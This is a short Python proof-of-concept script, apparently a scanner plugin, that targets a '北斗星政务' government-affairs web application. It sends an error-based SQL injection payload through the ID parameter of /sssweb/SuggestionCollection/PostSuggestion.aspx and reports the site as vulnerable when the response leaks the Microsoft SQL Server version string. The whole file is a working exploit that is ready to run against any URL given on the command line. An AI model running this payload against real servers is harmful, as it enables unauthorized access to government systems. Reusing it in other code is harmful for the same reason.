#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 北斗星政务PostSuggestion.aspx SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-076739
author: Lucifer
description: /sssweb/SuggestionCollection/PostSuggestion.aspx ID参数存在SQL注入。
'''
import sys
import requests
import warnings
def run(url):
        result = ['北斗星政务PostSuggestion.aspx SQL注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/sssweb/SuggestionCollection/PostSuggestion.aspx?ID=1%27AnD+1=char(73)%2Bchar(73)%2Bchar(73)%2B@@version--"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.status_code==500 and r"IIIMicrosoft" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    